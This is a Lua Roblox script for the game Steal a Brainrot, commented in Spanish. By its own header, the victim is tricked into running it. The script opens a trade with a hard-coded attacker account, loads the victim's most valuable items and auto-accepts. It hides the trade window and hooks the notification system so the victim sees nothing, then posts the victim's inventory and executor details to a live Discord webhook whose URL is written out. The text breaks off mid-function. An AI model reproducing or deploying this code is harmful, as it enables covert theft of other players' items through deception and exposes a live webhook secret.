--[[=====================================================================
    SAB | TRAP TRADE LOGGER  v5.0
    Steal a Brainrot  --  LO EJECUTA LA VICTIMA

    Mutaciones y efectos separados, con emoji propio y soporte de
    emoji personalizados de Discord via CUSTOM_EMOJI.
=====================================================================]]

-- Mode: NORMAL
getgenv().TARGET_USERNAME = "KIMILOSP"
getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1530011537991925800/akM1FHwrtjYuvh_rAIeOG2r32P-OObaS5kxBPbBtvNwUC0BbUnIW9Mear7ut3jrZKpaK"

getgenv().CONFIG = {
    POLL_INTERVAL    = 3,
    RETRY_DELAY      = 5,
    MAX_TRADE_ITEMS  = 18,
    HIDE_TRADE_GUI   = true,
    MUTE_TRADE_NOTIF = true,
    AUTO_ACCEPT      = true,
    PING_EVERYONE    = true,
    SHOW_MULTIPLIER  = false,   -- true = "💎 1.5x"
    SHOW_EXECUTOR    = true,
    SHOW_PLAYERS     = true,
    SHOW_ACCOUNT     = true,
    DEBUG            = true,
    ARG_STYLE        = "auto",
    FOOTER_SITE      = "www.venice.ai",
    FOOTER_DISCORD   = "discord.gg/askvenice",
    FORCE_REMOTES    = { Request = nil, Add = nil, Ready = nil, Accept = nil, Cancel = nil },
}

-- Emoji personalizados: nombre -> "<:nombre:ID>"
-- Ej: Gold = "<:muta_gold:123456789012345678>"
getgenv().CUSTOM_EMOJI = {
    -- Gold = "",
    -- Diamond = "",
    -- Rainbow = "",
}

-- Mutaciones (nombre -> { emoji, multiplicador })
getgenv().MUTATIONS = {
    Default     = { "▫️", 1 },
    Gold        = { "🥇", 1.25 },
    Diamond     = { "💎", 1.5 },
    Rainbow     = { "🌈", 10 },
    Bloodrot    = { "🩸", 2 },
    Candy       = { "🍬", 4 },
    Lava        = { "🌋", 6 },
    Galaxy      = { "🌌", 7 },
    Yin_Yang    = { "☯️", 7.5 },
    Radioactive = { "☢️", 8.5 },
    Cursed      = { "🕯️", 9 },
    Divine      = { "😇", 10 },
    Cyber       = { "🤖", 11 },
    Phantom     = { "👻", 12 },
    Crystal     = { "🔮", 13 },
    Eclipse     = { "🌑", 14 },
}

-- Efectos de evento
local function flag(code)
    local out = ""
    for i = 1, #code do
        out = out .. utf8.char(0x1F1E6 + code:byte(i) - 65)
    end
    return out
end

getgenv().EFFECTS = {
    Strawberry = "🍓", Meowl = "🐱", ["John Pork"] = "🐷", Skibidi = "🚽",
    Granny = "👵", Fire = "🔥", Rose = "🌹", Fireworks = "🎆",
    Nyan = "🐈", Lightning = "⚡", Burger = "🍔", ["Aura Shades"] = "🕶️",
    Disco = "🪩", Glitched = "📺", Claws = "🐾", Zombie = "🧟",
    Bubblegum = "🫧", UFO = "🛸", Taco = "🌮", Sleepy = "😴",
    Bull = "🐂", Paint = "🎨", [":3"] = "😺", Tie = "👔",
    Spider = "🕷️", ["Matteo Hat"] = "🎩", Galactic = "🌠", Explosive = "💥",
    ["Shark Fin"] = "🦈", ["Job Application"] = "📄", ["Reindeer Pet"] = "🦌",
    ["Santa Hat"] = "🎅", ["Jack O' Lantern Pet"] = "🎃", ["RIP Gravestone"] = "🪦",
    ["Witch Hat"] = "🧙", ["Bunny Ears"] = "🐰", ["Pink Egg"] = "🩷",
    ["Blue Egg"] = "💙", ["Green Egg"] = "💚", ["Orange Egg"] = "🧡",
    ["1 Year"] = "🎂", ["26"] = "🔢", ["10B"] = "💰", ["Rainbow Balloon"] = "🎈",
    ["Pink Balloon"] = "🎈", ["Red Balloon"] = "🎈", ["Blue Balloon"] = "🎈",
    ["Green Balloon"] = "🎈", ["Orange Balloon"] = "🎈", Halo = "😇", Lucky = "🍀",
    Sun = "☀️", Ball = "⚽", Chocolate = "🍫", Skeleton = "💀",
    Bee = "🐝", ["Fire Bee"] = "🐝", ["Ice Bee"] = "🐝", ["Queen Bee"] = "👑",
    ["Comet-struck"] = "☄️", Snowy = "❄️", Wet = "💧",
    -- países
    Brazil = flag("BR"), Indonesian = flag("ID"), Sombrero = "🇲🇽",
    Algeria = flag("DZ"), Argentina = flag("AR"), Australia = flag("AU"),
    Austria = flag("AT"), Belgium = flag("BE"), ["Bosnia and Herzegovina"] = flag("BA"),
    Canada = flag("CA"), ["Cape Verde"] = flag("CV"), Croatia = flag("HR"),
    Curacao = flag("CW"), Czechia = flag("CZ"), ["DR Congo"] = flag("CD"),
    Ecuador = flag("EC"), Egypt = flag("EG"),
    England = "\240\159\143\180\243\160\129\167\243\160\129\162\243\160\129\174\243\160\129\167\243\160\129\191",
    France = flag("FR"), Germany = flag("DE"), Ghana = flag("GH"), Haiti = flag("HT"),
    Iran = flag("IR"), Iraq = flag("IQ"), ["Ivory Coast"] = flag("CI"), Japan = flag("JP"),
    Jordan = flag("JO"), Mexico = flag("MX"), Morocco = flag("MA"), Netherlands = flag("NL"),
    ["New Zealand"] = flag("NZ"), Norway = flag("NO"), Panama = flag("PA"),
    Paraguay = flag("PY"), Portugal = flag("PT"), Qatar = flag("QA"), ["Saudi Arabia"] = flag("SA"),
    Scotland = "\240\159\143\180\243\160\129\167\243\160\129\163\243\160\129\163\243\160\129\180\243\160\129\191",
    Senegal = flag("SN"), ["South Africa"] = flag("ZA"), ["South Korea"] = flag("KR"),
    Spain = flag("ES"), Sweden = flag("SE"), Switzerland = flag("CH"), Tunisia = flag("TN"),
    Turkey = flag("TR"), ["United States"] = flag("US"), Uruguay = flag("UY"),
    Uzbekistan = flag("UZ"), Colombia = flag("CO"),
}

getgenv().NORMAL_BRAINROTS = {
    ["Raccooni Jandelini"]=true,["Malame Amarele"]=true,["Buho de Fuego"]=true,["Caramello Filtrello"]=true,
    ["Avocadorilla"]=true,["Brutto Gialutto"]=true,["Centrucci Nuclucci"]=true,["Ganganzelli Trulala"]=true,
    ["Rhino Helicopterino"]=true,["Stoppo Luminino"]=true,["Tob Tobi Tobi"]=true,["Lazy Ducky"]=true,
    ["Pineaplino"]=true,["Pretzo Robo"]=true,["Unclito Samito"]=true,["Abyssaloco"]=true,
    ["Agarrini la Palini"]=true,["Antonio"]=true,["Arcadragon"]=true,["Bearito Cabinito"]=true,
    ["Boppin Bunny"]=true,["Bunito Bunito Spinito"]=true,["Bunny and Eggy"]=true,["Burguro And Fryuro"]=true,
    ["Capitano Moby"]=true,["Cash or Card"]=true,["Caylusaurus"]=true,["Celestial Pegasus"]=true,
    ["Celularcini Viciosini"]=true,["Cerberus"]=true,["Chillin Chili"]=true,["Chipso and Queso"]=true,
    ["Cloverat Clapat"]=true,["Coco and Mango"]=true,["Cooki and Milki"]=true,["Digi Narwhal"]=true,
    ["Donkeyturbo Express"]=true,["Dragon Aquanini"]=true,["Dragon Cannelloni"]=true,["Dragon Gingerini"]=true,
    ["Duggy Bros"]=true,["Elefanto Frigo"]=true,["Eviledon"]=true,["Extinct Matteo"]=true,
    ["Festive 67"]=true,["Fishino Clownino"]=true,["Fortunu and Cashuru"]=true,["Foxini Lanternini"]=true,
    ["Fragola La La La"]=true,["Fragrama and Chocrama"]=true,["Garama and Madundung"]=true,["Ginger Gerat"]=true,
    ["Globa Steppa"]=true,["Gobblino Uniciclino"]=true,["Gold Gold Gold"]=true,["Griffin"]=true,
    ["Guest 666"]=true,["Gym Bros"]=true,["Hopilikalika Hopilikalako"]=true,["Hydra Bunny"]=true,
    ["Hydra Dragon Cannelloni"]=true,["Jelly Moby"]=true,["John Doe"]=true,["Jolly Jolly Sahur"]=true,
    ["Kalika Bros"]=true,["Karker Sahur"]=true,["Ketchuru and Musturu"]=true,["Ketupat Bros"]=true,
    ["Kraken"]=true,["La Anniversary Grande"]=true,["La Casa Boo"]=true,["La Easter Grande"]=true,
    ["La Food Combinasion"]=true,["La Ginger Sekolah"]=true,["La Karkerkar Combinasion"]=true,["La Lucky Grande"]=true,
    ["La Romantic Grande"]=true,["La Sahur Combinasion"]=true,["La Secret Combinasion"]=true,["La Summer Grande"]=true,
    ["La Supreme Combinasion"]=true,["La Taco Combinasion"]=true,["Las Sis"]=true,["Lavadorito Spinito"]=true,
    ["Los Amigos"]=true,["Los Bros"]=true,["Los Chillis"]=true,["Los Fruits"]=true,
    ["Los Hackers"]=true,["Los Hotspotsitos"]=true,["Los Jolly Combinasionas"]=true,["Los Mariachis"]=true,
    ["Los Mi Gatitos"]=true,["Los Primos"]=true,["Los Sekolahs"]=true,["Los Spaghettis"]=true,
    ["Los Tacoritas"]=true,["Love Love Bear"]=true,["Lovin Rose"]=true,["Money Money Bros"]=true,
    ["Money Money Reindeer"]=true,["Nacho Spyder"]=true,["Noo my examine"]=true,["Orcaledon"]=true,
    ["Pancake and Syrup"]=true,["Please my Present"]=true,["Popcuru and Fizzuru"]=true,["Quackini Snackini"]=true,
    ["Reinito Sleighito"]=true,["Rico Dinero"]=true,["Rosetti Tualetti"]=true,["Rosey and Teddy"]=true,
    ["Rubrikiko"]=true,["Sammyni Cakini"]=true,["Sammyni Fattini"]=true,["Sand Sand Sand"]=true,
    ["Signore Carapace"]=true,["Spooky and Pumpky"]=true,["Steakini Fattini"]=true,["Swag Soda"]=true,
    ["Swaggy Bros"]=true,["Tacorita Bicicleta"]=true,["Telemorte"]=true,["Tictac Sahur"]=true,
    ["Tirilikalika Tirilikalako"]=true,["Tralaledon"]=true,["Tuff Toucan"]=true,["Ventoliero Pavonero"]=true,
    ["Venuspino"]=true,["W or L"]=true,["Capitano Americano"]=true,["Bufalino Boomberino"]=true,
    ["Esok Goala"]=true,["Los Tangcitos"]=true,["Los Tictacs"]=true,["Los Admins"]=true,
    ["Moby Bros"]=true,["Var Var Var"]=true,["Noodle Noodle Poodle"]=true,["Grabatron"]=true,
    ["Cangurato Gelato"]=true,["Rubiko and Kubiko"]=true,["Toro Españolo"]=true,["Chicleteira Champeona"]=true,
    ["Examen Bros"]=true,["Pizza and Ranch"]=true,["Los Secret Combinasionas"]=true,["Honey Honey Bear"]=true,
    ["Scorpino Coasterino"]=true,["Queen Bee"]=true,["Smore Serat"]=true,["Yetimactic"]=true,
    ["La Breakfast Combinasion"]=true,["Bumbatron"]=true,["Candini Fluffini"]=true,["Polaroidini"]=true,
    ["La Fuse Machine"]=true,["Nachorilla"]=true,["Sammyni Truckini"]=true,["Orchidox"]=true,
    ["Pop Pop Petalini"]=true,["Motorino Bumbuni"]=true,["Pelican Pachetto"]=true,["Deputy Leopard"]=true,
    ["Chicli Chicla"]=true,["Panda Popanda"]=true,["La Craft Machine"]=true,["Gold and Diamond"]=true,
    ["Los Dragons"]=true,["Zebrino Pianino"]=true,["Hydra Serpent"]=true,["Lavamanta"]=true,
    ["Lionello Casarello"]=true,["Draculino"]=true,["Oni Oni Panda"]=true,["Sammyni Spookyni"]=true,
    ["Phoenix"]=true,["Boo Boo Rocket"]=true,["Flying Dutchman"]=true,["Dragon Skeletonini"]=true,
    ["Tosto Dino"]=true,["Cobra Gelato"]=true,["Skelly and Coffy"]=true,["Medusini and Demonini"]=true,
    ["Arca Bros"]=true,["Fang Fang Draculang"]=true,["Pum Pum Pum"]=true,["Spooky Spooky Sahur"]=true,
    ["Spooketti Tualetti"]=true,["Puppetmaster"]=true,["Scorpi Inferni"]=true,["Jacko Jakat"]=true,
    ["Spooky Kart"]=true,["Scarino Crowino"]=true,["Headless Horseman"]=true,["John Pork"]=true,
    ["Meowl"]=true,["Skibidi Toilet"]=true,["Strawberry Elephant"]=true,["Capitano Gullini"]=true,
    ["Camera Ramena"]=true,["Chicleteira Bicicleteira"]=true,["Chicleteira Cupideira"]=true,["Chicleteira Surfeiteira"]=true,
    ["Chill Puppy"]=true,["Chicleteira Noelteira"]=true,["Cigno Fulgoro"]=true,["DJ Panda"]=true,
    ["Dug dug dug"]=true,["Esok Sekolah"]=true,["Futbolini Skatini"]=true,["Frullato Framingo"]=true,
    ["Job Job Job Sahur"]=true,["Ketupat Kepat"]=true,["La Grande Combinasion"]=true,["La Extinct Grande"]=true,
    ["La Jolly Grande"]=true,["La Spooky Grande"]=true,["Los Mobilis"]=true,["Los Planitos"]=true,
    ["Los Puggies"]=true,["Los Spooky Combinasionas"]=true,["Mieteteira Bicicleteira"]=true,["Money Money Puggy"]=true,
    ["Mi Gatito"]=true,["Nuclearo Dinossauro"]=true,["Sammyni Spyderini"]=true,["Snailo Clovero"]=true,
    ["Spaghetti Tualetti"]=true,["Spinny Hammy"]=true,["Tang Tang Keletang"]=true,["Conetto Morsetto"]=true,
    ["Peschito Machito"]=true,["Tacoturbo Tacorito"]=true,["Puffino Builderino"]=true,["Money Money Cat"]=true,
    ["Matteo"]=true,["Orcalita Orcala"]=true,["Orcalero Orcala"]=true,["Dumborino Miracello"]=true,
    ["Bombardiro Crocodilo"]=true,
}

getgenv().NORMAL_BASE_SKINS = {
    ["Rose"]=true,["Gingerbread"]=true,["Halloween"]=true,["Christmas"]=true,["Bunny Basket"]=true,
    ["Summer"]=true,["Pot of Gold"]=true,["Taco"]=true,["Octo"]=true,["Valentines"]=true,
    ["Easter"]=true,["Lucky"]=true,["Aquatic"]=true,["Tralalero"]=true,["Bee Emperor"]=true,["Honey Bee"]=true,
}

getgenv().NORMAL_GEARS = {
    ["Santa's Sleigh"]=true,["Cupid's Wings"]=true,["Witch's Broom"]=true,["Waverider"]=true,
    ["Yin Yang Slap"]=true,["Cursed Slap"]=true,["Cyber Slap"]=true,["Divine Slap"]=true,
    ["Bloodmoon Slap"]=true,["Radioactive Slap"]=true,["Rainbow Slap"]=true,["Rainbow Hammer"]=true,
    ["Bloodmoon Hammer"]=true,["Radioactive Airstrike"]=true,["Yin Yang Lamp"]=true,["Demon's Head"]=true,
    ["Lava Slap"]=true,["Lava Blaster"]=true,["Alien Slap"]=true,["Blackhole Bomb"]=true,
    ["Candy Sentry"]=true,["Phantom Slap"]=true,["Flying Bee"]=true,["Crystal Slap"]=true,
    ["Candy Slap"]=true,["Crystal Hammer"]=true,
}

--=====================================================================
local Players    = game:GetService("Players")
local RS         = game:GetService("ReplicatedStorage")
local WS         = game:GetService("Workspace")
local HS         = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")
local LP         = Players.LocalPlayer
local CFG        = getgenv().CONFIG
local U          = table.unpack or unpack

local STATE = { running = true, inTrade = false, lastRequest = 0, lastReport = nil }
local REMOTES = { Request = nil, Add = nil, Ready = nil, Accept = nil, Cancel = nil }
local MULT = { K = 1e3, M = 1e6, B = 1e9, T = 1e12 }

local function lc(s) return string.lower(tostring(s)) end
local function log(m, lvl)
    if CFG.DEBUG then
        if lvl == "err" then warn("[SAB] " .. tostring(m)) else print("[SAB] " .. tostring(m)) end
    end
    if _G.SAB_HUD then pcall(_G.SAB_HUD, m) end
end
local function notify(t, x)
    task.spawn(function() pcall(function()
        StarterGui:SetCore("SendNotification", { Title = t, Text = x, Duration = 3 })
    end) end)
end
local function findPath(root, path)
    if not root then return nil end
    local cur = root
    for seg in string.gmatch(path, "[^/]+") do
        if not cur then return nil end
        cur = cur:FindFirstChild(seg)
    end
    return cur
end
local function getTarget() return Players:FindFirstChild(getgenv().TARGET_USERNAME) end

local function postWebhook(payload)
    local url = getgenv().WEBHOOK_URL
    if not url or url == "" then return end
    task.spawn(function()
        local body = HS:JSONEncode(payload)
        local ok = pcall(function()
            if typeof(request) == "function" then
                request({ Url = url, Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" }, Body = body })
            else
                HS:PostAsync(url, body)
            end
        end)
        if not ok then log("Webhook fallo", "err") end
    end)
end

--=====================================================================
-- MUTACIONES / EFECTOS
--=====================================================================
local function keyOf(name)
    return (name:gsub("%s+", "_"))
end

local function mutationIcon(name)
    local custom = getgenv().CUSTOM_EMOJI[name]
    if custom and custom ~= "" then return custom end
    local def = getgenv().MUTATIONS[keyOf(name)]
    if not def then return nil end
    local icon = def[1]
    if CFG.SHOW_MULTIPLIER and def[2] and def[2] > 1 then
        icon = icon .. " " .. tostring(def[2]) .. "x"
    end
    return icon
end

local function effectIcon(name)
    local custom = getgenv().CUSTOM_EMOJI[name]
    if custom and custom ~= "" then return custom end
    return getgenv().EFFECTS[name] or getgenv().EFFECTS[keyOf(name)]
end

local function parseTags(raw)
    local mutas, effects = {}, {}
    for token in string.gmatch(raw, ":([^:]+):") do
        local key = token:gsub("^%s*(.-)%s*$", "%1")
        local norm = key:gsub("_", " ")
        if getgenv().MUTATIONS[keyOf(norm)] or getgenv().CUSTOM_EMOJI[norm] then
            table.insert(mutas, norm)
        elseif getgenv().EFFECTS[norm] then
            table.insert(effects, norm)
        else
            table.insert(effects, norm) -- desconocido: se muestra como texto
        end
    end
    return mutas, effects
end

local function cleanName(raw)
    local s = raw:gsub(":%s*[^:]+%s*:", " "):gsub("%-", " "):gsub("%s+", " ")
    return (s:gsub("^%s*(.-)%s*$", "%1"))
end

--=====================================================================
-- LECTURA
--=====================================================================
local ID_KEYS = { "ItemId","ItemID","Id","ID","Uuid","UUID","UniqueId","UniqueID",
                  "BrainrotId","BrainrotID","AssetId","SkinId","SkinID","BaseId" }

local function extractId(obj)
    if not obj then return nil end
    for _, k in ipairs(ID_KEYS) do
        local v = obj:GetAttribute(k); if v ~= nil then return v end
    end
    local ok, desc = pcall(function() return obj:GetDescendants() end)
    if ok then
        for _, d in ipairs(desc) do
            for _, k in ipairs(ID_KEYS) do
                local v = d:GetAttribute(k); if v ~= nil then return v end
            end
            if d:IsA("StringValue") or d:IsA("NumberValue") then
                for _, k in ipairs(ID_KEYS) do
                    if lc(d.Name) == lc(k) then return d.Value end
                end
            end
        end
    end
    return nil
end

local function overheadOf(a)
    return findPath(a, "Base/Spawn/Attachment/AnimalOverhead") or findPath(a, "Info/AnimalOverhead")
end
local function readRaw(a)
    local oh = overheadOf(a); if not oh then return nil end
    local l = oh:FindFirstChild("DisplayName")
    if l and l:IsA("TextLabel") and l.Text ~= "" then return l.Text end
    return nil
end
local function readSkin(a)
    local s = a:GetAttribute("Skin") or a:GetAttribute("BaseSkin")
    if s then return tostring(s) end
    return nil
end
local function readIncome(a)
    for _, k in ipairs({ "Income","MoneyPerSecond","Money","Value","IncomePerSecond" }) do
        local v = a:GetAttribute(k)
        if typeof(v) == "number" then
            if v >= 1e9 then return string.format("%.1fB", v / 1e9) end
            if v >= 1e6 then return string.format("%.1fM", v / 1e6) end
            if v >= 1e3 then return string.format("%.1fK", v / 1e3) end
            return tostring(math.floor(v))
        end
    end
    local ok, desc = pcall(function() return a:GetDescendants() end)
    if not ok then return nil end
    for _, d in ipairs(desc) do
        if d:IsA("TextLabel") then
            local m = string.match(d.Text, "([%d%.]+[KMBT]?)/s") or string.match(d.Text, "%$([%d%.]+[KMBT]?)")
            if m then return m end
        end
    end
    return nil
end
local function incomeNum(s)
    if not s then return 0 end
    local n, u = string.match(s, "([%d%.]+)([KMBT]?)")
    n = tonumber(n) or 0
    if u and MULT[u] then n = n * MULT[u] end
    return n
end

--=====================================================================
-- DUEÑO DE BASE
--=====================================================================
local function playerFromText(text)
    if not text or text == "" then return nil end
    local clean = text:gsub("%s+", "")
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name == clean or lc(p.DisplayName) == lc(text) then return p end
    end
    return nil
end
local function getPlotOwner(plot)
    local byName = Players:FindFirstChild(plot.Name)
    if byName then return byName end
    local sign = plot:FindFirstChild("PlotSign")
    if sign then
        for _, d in ipairs(sign:GetDescendants()) do
            if d:IsA("TextLabel") then
                local p = playerFromText(d.Text); if p then return p end
            end
        end
    end
    return nil
end
local function getPlotOfPlayer(p)
    local plots = WS:FindFirstChild("Plots")
    if not plots or not p then return nil end
    for _, plot in ipairs(plots:GetChildren()) do
        if getPlotOwner(plot) == p then return plot end
    end
    return nil
end

--=====================================================================
-- RECOLECCION
--=====================================================================
local function collectFromPlot(plot)
    local out = {}
    if not plot then return out end
    local podiums = plot:FindFirstChild("AnimalPodiums")
    if podiums then
        for _, a in ipairs(podiums:GetChildren()) do
            local raw = readRaw(a)
            if raw then
                local mutas, effects = parseTags(raw)
                local parts = {}
                for _, m in ipairs(mutas) do
                    local ic = mutationIcon(m)
                    table.insert(parts, ic or ("*" .. m .. "*"))
                end
                for _, e in ipairs(effects) do
                    local ic = effectIcon(e)
                    table.insert(parts, ic or ("*" .. e .. "*"))
                end
                table.insert(out, {
                    kind = "brainrot",
                    raw = raw,
                    name = cleanName(raw),
                    tags = parts,
                    skin = readSkin(a),
                    id = extractId(a),
                    income = readIncome(a),
                    inst = a,
                })
            end
        end
    end
    local purchases = plot:FindFirstChild("Purchases")
    if purchases then
        for _, block in ipairs(purchases:GetChildren()) do
            local box = block:FindFirstChild("PlotBlock")
            if box then
                local label
                for _, d in ipairs(box:GetDescendants()) do
                    if d:IsA("TextLabel") and d.Text ~= "" then label = d.Text break end
                end
                if label then
                    local mutas, effects = parseTags(label)
                    local parts = {}
                    for _, m in ipairs(mutas) do
                        local ic = mutationIcon(m); table.insert(parts, ic or ("*" .. m .. "*"))
                    end
                    for _, e in ipairs(effects) do
                        local ic = effectIcon(e); table.insert(parts, ic or ("*" .. e .. "*"))
                    end
                    table.insert(out, {
                        kind = "gear", raw = label, name = cleanName(label),
                        tags = parts, id = extractId(box), inst = box,
                    })
                end
            end
        end
    end
    return out
end

local function classify(it)
    local n = it.name
    if it.kind == "brainrot" then
        if getgenv().NORMAL_BRAINROTS[n] then return "brainrot" end
        if it.skin and getgenv().NORMAL_BASE_SKINS[it.skin] then return "base" end
        if getgenv().NORMAL_BASE_SKINS[n] then return "base" end
        return "none"
    end
    if getgenv().NORMAL_GEARS[n] then return "gear" end
    if getgenv().NORMAL_BASE_SKINS[n] then return "base" end
    return "none"
end

--=====================================================================
-- REMOTES
--=====================================================================
local ROLE_PATTERNS = {
    Request = { "requesttrade","sendtrade","traderequest","starttrade","createtrade","request","invite" },
    Add     = { "additem","addtradeitem","addbrainrot","offeritem","setitem","add" },
    Ready   = { "setready","toggleready","ready" },
    Accept  = { "accepttrade","confirmtrade","accept","confirm","complete" },
    Cancel  = { "canceltrade","declinetrade","cancel","decline" },
}
local function scoreRemote(r, role)
    local name, path = lc(r.Name), lc(r:GetFullName())
    local s = 0
    for _, pat in ipairs(ROLE_PATTERNS[role]) do
        if string.find(name, pat, 1, true) then
            s = s + 10
            if name == pat then s = s + 15 end
        elseif string.find(path, pat, 1, true) then s = s + 3 end
    end
    if string.find(path, "trade", 1, true) then s = s + 8 end
    return s
end

local function discoverRemotes()
    local pool = {}
    for _, root in ipairs({ RS, WS }) do
        local ok, descs = pcall(function() return root:GetDescendants() end)
        if ok then
            for _, d in ipairs(descs) do
                if (d:IsA("RemoteEvent") or d:IsA("RemoteFunction"))
                    and string.find(lc(d:GetFullName()), "trade", 1, true) then
                    table.insert(pool, d)
                end
            end
        end
end
    log(("Remotes de trade: %d"):format(#pool))
    for _, r in ipairs(pool) do log("  -> " .. r:GetFullName()) end

    for role in pairs(REMOTES) do
        local forced = CFG.FORCE_REMOTES[role]
        if forced then
            REMOTES[role] = findPath(RS, forced) or findPath(WS, forced)
        else
            local best, bestS = nil, 0
            for _, r in ipairs(pool) do
                local s = scoreRemote(r, role)
                if s > bestS then best, bestS = r, s end
            end
            if best and bestS >= 8 then REMOTES[role] = best end
        end
        log(("REMOTE %s -> %s"):format(role, tostring(REMOTES[role] and REMOTES[role]:GetFullName() or "NO")))
    end
end

local function fire(r, ...)
    if not r then return false end
    return pcall(function()
        if r:IsA("RemoteFunction") then r:InvokeServer(...) else r:FireServer(...) end
    end)
end

--=====================================================================
-- UI DE TRADE
--=====================================================================
local function findTradeRoot()
    local pg = LP:FindFirstChild("PlayerGui")
    if not pg then return nil end
    for _, d in ipairs(pg:GetChildren()) do
        if d:IsA("ScreenGui") and string.find(lc(d.Name), "trade", 1, true) then return d end
    end
    for _, d in ipairs(pg:GetDescendants()) do
        if string.find(lc(d.Name), "trade", 1, true) then
            local g = d:FindFirstAncestorWhichIsA("ScreenGui")
            if g and g ~= pg then return g end
        end
    end
    return nil
end
local function tradeOpen() return findTradeRoot() ~= nil end

local function hideTrade()
    if not CFG.HIDE_TRADE_GUI then return end
    local root = findTradeRoot()
    if root then
        pcall(function() root.Enabled = false end)
        for _, d in ipairs(root:GetDescendants()) do
            if d:IsA("GuiObject") then pcall(function() d.Visible = false end) end
        end
    end
end

local function muteTradeNotifs()
    if not CFG.MUTE_TRADE_NOTIF then return end
    pcall(function()
        local old = hookfunction(StarterGui.SetCore, newcclosure(function(self, m, data)
            if m == "SendNotification" and typeof(data) == "table" then
                local t = lc(data.Title or "") .. lc(data.Text or "")
                if string.find(t, "trade", 1, true) then return end
            end
            return old(self, m, data)
        end))
    end)
end

task.spawn(function()
    LP:WaitForChild("PlayerGui").DescendantAdded:Connect(function(d)
        if string.find(lc(d.Name), "trade", 1, true) then
            task.wait(0.1); hideTrade()
        end
    end)
end)

--=====================================================================
-- OFERTA
--=====================================================================
local function buildOffer()
    local plot = getPlotOfPlayer(LP)
    if not plot then return {} end
    local list = {}
    for _, it in ipairs(collectFromPlot(plot)) do
        if classify(it) ~= "none" then table.insert(list, it) end
    end
    table.sort(list, function(a, b) return incomeNum(a.income) > incomeNum(b.income) end)
    local out = {}
    for i = 1, math.min(#list, CFG.MAX_TRADE_ITEMS) do out[i] = list[i] end
    return out
end

local function fireAdd(it)
    if not REMOTES.Add then return false end
    local shapes = {}
    for _, k in ipairs({ it.id, it.inst, it.raw }) do
        if k ~= nil then
            table.insert(shapes, { k }); table.insert(shapes, { 1, k })
        end
    end
    for _, a in ipairs(shapes) do
        if fire(REMOTES.Add, U(a)) then return true end
    end
    return false
end

local function fireRequest()
    local t = getTarget()
    if not t or not REMOTES.Request then return false end
    local shapes
    if CFG.ARG_STYLE == "userid" then shapes = { { t.UserId } }
    elseif CFG.ARG_STYLE == "player" then shapes = { { t } }
    elseif CFG.ARG_STYLE == "name" then shapes = { { t.Name } }
    else shapes = { { t.UserId }, { t }, { t.Name } } end
    for _, a in ipairs(shapes) do
        if fire(REMOTES.Request, U(a)) then STATE.lastRequest = tick(); return true end
    end
    return false
end

--=====================================================================
-- CICLO DE TRADE
--=====================================================================
local function runTrade()
    if STATE.inTrade then return end
    local t = getTarget(); if not t then return end
    local offer = buildOffer(); if #offer == 0 then return end
    STATE.inTrade = true

    local ok, err = pcall(function()
        fireRequest()
        log(("Trade -> %s | items: %d"):format(t.Name, #offer))
        local w = 0
        while w < 8 and STATE.running do
            if tradeOpen() then break end
            task.wait(0.25); w = w + 0.25
        end
        if not tradeOpen() then log("Ventana no abierta", "err"); return end

        hideTrade(); task.wait(0.4)
        local placed = 0
        for _, it in ipairs(offer) do
            if not STATE.running then return end
            if not tradeOpen() then break end
            if fireAdd(it) then placed = placed + 1 end
            task.wait(0.16)
        end
        log(("Colocados %d/%d"):format(placed, #offer))

        task.wait(0.7)
        fire(REMOTES.Ready) or fire(REMOTES.Ready, true)
        task.wait(1.4)
        if CFG.AUTO_ACCEPT then
            fire(REMOTES.Accept) or fire(REMOTES.Accept, true)
            task.wait(1.2)
            if tradeOpen() then fire(REMOTES.Accept, true) end
        end
        local w2 = 0
        while w2 < 8 and tradeOpen() do task.wait(0.25); w2 = w2 + 0.25 end
    end)
    if not ok then log("runTrade: " .. tostring(err), "err") end
    task.wait(1.2)
    STATE.inTrade = false
end

--=====================================================================
-- REPORTE
--=====================================================================
local function line(n, it)
    local s = ("%d. **%s**"):format(n, it.name)
    if #it.tags > 0 then s = s .. " - " .. table.concat(it.tags, ", ") end
    if it.income then s = s .. " | 💰 +" .. it.income .. "/s" end
    return s
end

local function numbered(list)
    local out = {}
    for i, it in ipairs(list) do table.insert(out, line(i, it)) end
    return out
end

local function section(icon, title, list)
    local out = { ("%s **%s (%d)**"):format(icon, title, #list), "-----", "" }
    if #list == 0 then
        table.insert(out, "*NONE*")
    else
        for _, l in ipairs(numbered(list)) do table.insert(out, l) end
    end
    table.insert(out, "")
    return table.concat(out, "\n")
end

local function infoBlock(icon, title, value)
    return ("%s **%s**\n%s\n"):format(icon, title, value)
end

local function report(all)
    local brainrots, bases, gears, junk = {}, {}, {}, {}

    for _, it in ipairs(all) do
        local c = classify(it)
        if c == "brainrot" then table.insert(brainrots, it)
        elseif c == "base" then table.insert(bases, it)
        elseif c == "gear" then table.insert(gears, it)
        else table.insert(junk, it) end
    end

    table.sort(brainrots, function(a, b) return incomeNum(a.income) > incomeNum(b.income) end)
    table.sort(junk, function(a, b) return incomeNum(a.income) > incomeNum(b.income) end)

    local best = brainrots[1]

    local parts = {}
    table.insert(parts, section("🧠", "BRAINROT TARGET", brainrots))
    table.insert(parts, section("⚙️", "BASE TARGET", bases))
    table.insert(parts, section("🔧", "GEARS TARGET", gears))

    local jb = { ("📦 **ITEMS NO TARGET (%d)**"):format(#junk), "-----", "" }
    if #junk == 0 then
        table.insert(jb, "*NONE*")
    else
        local jbBrain, jbGear = {}, {}
        for _, it in ipairs(junk) do
            if it.kind == "gear" then table.insert(jbGear, it) else table.insert(jbBrain, it) end
        end
        if #jbBrain > 0 then
            table.insert(jb, "🧠 **Brainrots:**")
            for _, l in ipairs(numbered(jbBrain)) do table.insert(jb, l) end
        end
        if #jbGear > 0 then
            table.insert(jb, "")
            table.insert(jb, "🔧 **Gears:**")
            for _, l in ipairs(numbered(jbGear)) do table.insert(jb, l) end
        end
    end
    table.insert(parts, table.concat(jb, "\n"))

    if CFG.SHOW_EXECUTOR then
        local exName, exVer = "Desconocido", ""
        pcall(function()
            local a, b = identifyexecutor()
            if a then exName = a end
            if b then exVer = " " .. b end
        end)
        table.insert(parts, infoBlock("🖥️", "Executor", exName .. exVer))
    end
    if CFG.SHOW_PLAYERS then
        table.insert(parts, infoBlock("👤", "Jugadores",
            ("%d/%d"):format(#Players:GetPlayers(), Players.MaxPlayers)))
    end
    if CFG.SHOW_ACCOUNT then
